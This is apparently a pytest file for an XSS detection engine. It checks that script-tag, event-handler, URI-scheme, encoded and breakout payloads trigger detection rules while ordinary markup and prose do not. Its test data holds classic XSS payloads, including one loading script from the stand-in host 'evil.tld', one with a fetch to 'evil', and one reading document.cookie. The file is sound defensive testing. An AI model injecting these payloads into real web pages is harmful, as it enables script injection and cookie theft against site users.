"""XSS pattern classes, and the markup that must never be mistaken for them (plan P4)."""

from __future__ import annotations

import pytest

from talos.detection.patterns.pattern_engine import distinct_classes, is_actionable, match_patterns
from talos.detection.patterns.xss_pattern_rules import (
    XSS_RULES,
    is_unambiguous,
    payload_signature,
)


def hits(payload: str):
    return match_patterns({"query.q": payload}, XSS_RULES)


@pytest.mark.parametrize(
    ("payload", "expected_class"),
    [
        ("<script>alert(1)</script>", "script_tag"),
        ("<script src=//evil.tld/x.js></script>", "script_tag"),
        ("<svg onload=alert(1)>", "script_tag"),
        ("<img src=x onerror=alert(1)>", "event_handler"),
        ("<div onmouseover=fetch('//evil')>hover</div>", "event_handler"),
        ("javascript:alert(document.cookie)", "uri_scheme"),
        ("data:text/html,<script>alert(1)</script>", "uri_scheme"),
        ("%3Cscript%3Ealert(1)%3C/script%3E", "encoded"),
        ('"><img src=x onerror=prompt(1)>', "breakout"),
    ],
)
def test_attack_payload_fires_its_class(payload: str, expected_class: str) -> None:
    found = hits(payload)
    assert is_actionable(found), payload
    assert expected_class in distinct_classes(found), payload


@pytest.mark.parametrize(
    "payload",
    [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "<svg onload=alert(1)>",
        "%3Cscript%3Ealert(1)%3C/script%3E",
    ],
)
def test_decisive_payloads_need_no_model(payload: str) -> None:
    assert is_unambiguous(hits(payload))


def test_whitespace_padding_does_not_evade() -> None:
    assert is_unambiguous(hits("java script:alert(1)".replace(" ", ""))) is True
    assert is_unambiguous(hits("< script >alert(1)</script>"))


@pytest.mark.parametrize(
    "payload",
    [
        "<b>bold</b>",
        "<p>hello world</p>",
        "<i>italic</i> and <u>underline</u>",
        "C++ <iostream>",
        "the onerror handler was never called",
        "onerror",
        "5 > 3 and 2 < 4",
        "script kiddie",
        "see https://example.com/a?b=1",
        "email me: a@b.co",
        "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAAB",
        "shoes",
        "<3",
    ],
)
def test_benign_markup_and_prose_do_not_fire(payload: str) -> None:
    """`<b>bold</b>` in a comment field is the most common lookalike in the corpus."""
    assert not is_actionable(hits(payload)), f"false positive on {payload!r}"


def test_inert_markup_is_recorded_but_not_actionable() -> None:
    found = hits("<b>bold</b>")
    assert found, "the fragment should still be recorded for corroboration"
    assert not is_actionable(found)


def test_handler_needs_an_assignment_to_count() -> None:
    """ "onerror" in prose is not an attack; `onerror=` wired to something is."""
    assert not is_actionable(hits("the onerror callback"))
    assert is_actionable(hits("onerror=alert(1)"))


def test_an_unrecognised_handler_is_actionable_but_judged() -> None:
    """Without one actionable-ambiguous rule the XSS judge path would be dead code."""
    found = hits("<div onpointerdown=steal()>")
    assert is_actionable(found)
    assert not is_unambiguous(found)


def test_the_signature_is_stable_across_endpoints() -> None:
    """Stored-XSS detection matches the same payload at a different endpoint, so the signature
    must not depend on where it was seen."""
    first = match_patterns({"query.comment": "<script>alert(1)</script>"}, XSS_RULES)
    second = match_patterns({"body": "<script>alert(1)</script>"}, XSS_RULES)
    assert payload_signature(first) == payload_signature(second)


def test_different_payloads_have_different_signatures() -> None:
    assert payload_signature(hits("<script>alert(1)</script>")) != payload_signature(
        hits("<img src=x onerror=alert(9)>")
    )
